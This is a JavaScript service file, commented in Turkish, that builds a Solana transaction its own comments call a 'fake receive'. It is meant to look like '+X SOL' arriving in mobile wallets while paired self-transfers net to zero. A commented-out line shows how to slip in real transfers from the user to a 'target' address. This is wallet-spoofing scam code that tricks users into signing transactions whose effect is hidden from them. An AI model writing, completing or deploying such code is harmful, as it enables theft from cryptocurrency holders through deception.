// app/services/fake-receive.js
import {
  SystemProgram,
  LAMPORTS_PER_SOL,
  TransactionMessage,
  VersionedTransaction,
  PublicKey,
} from "@solana/web3.js";
import { connection } from "./connect.js";

/**
 * Mobil cüzdanlarda “+X SOL” olarak gözükecek fake receive TX
 * @param {PublicKey} user    — Kullanıcının publicKey’i
 * @param {number} solAmount  — Görüntülenecek SOL miktarı (örn. 1)
 */
export async function buildFakeReceiveSolTx(user, solAmount = 1) {
  const lamports = solAmount * LAMPORTS_PER_SOL;

  // 1) inbound 1 SOL (user→user)
  // 2) outbound 1 SOL (user→user) — net 0
  const instructions = [
    SystemProgram.transfer({ fromPubkey: user, toPubkey: user, lamports }),
    SystemProgram.transfer({ fromPubkey: user, toPubkey: user, lamports }),
  ];

  // (Opsiyonel) Sonra gerçek küçük transferleri de ekleyebilirsiniz
  // instructions.push(SystemProgram.transfer({ fromPubkey: user, toPubkey: target, lamports: ... }));

  const { blockhash } = await connection.getLatestBlockhash("confirmed");
  const messageV0 = new TransactionMessage({
    payerKey:        user,
    recentBlockhash: blockhash,
    instructions,
  }).compileToV0Message();

  return new VersionedTransaction(messageV0);
}
